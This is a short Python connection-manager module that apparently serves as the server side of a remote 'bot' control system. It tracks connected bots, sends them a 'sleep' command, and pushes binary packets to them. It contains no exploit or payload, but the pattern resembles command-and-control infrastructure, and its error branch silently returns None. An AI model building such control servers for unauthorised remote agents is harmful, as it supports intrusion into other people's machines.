# backend/Services/ClientManager.py
import logs.LoggerWrapper as logger

active_clients = {}

async def close_client(bot_id, send_sleep=True):
    if not (session := active_clients.get(bot_id)): return False
    reader, writer = session
    try:
        if send_sleep: (writer.write(b"sleep\n"), await writer.drain())
        writer.close(); await writer.wait_closed()
    except: pass
    finally:
        active_clients.pop(bot_id, None)
        logger.Log.info(f"[-] Бот {bot_id} отключен")
    return True

async def close_all_clients():
    return sum([await close_client(bot_id) for bot_id in list(active_clients.keys())])

def list_clients():
    return [{"id": bot_id, "status": "online"} for bot_id in active_clients]

async def send_binary_to_bot(bot_id, packet):
    if not (session := active_clients.get(bot_id)): return False
    try:
        session[1].write(packet); await session[1].drain()
        return True
    except Exception as error: (logger.Log.error(f"[Manager] Send error {bot_id}: {error}"), False)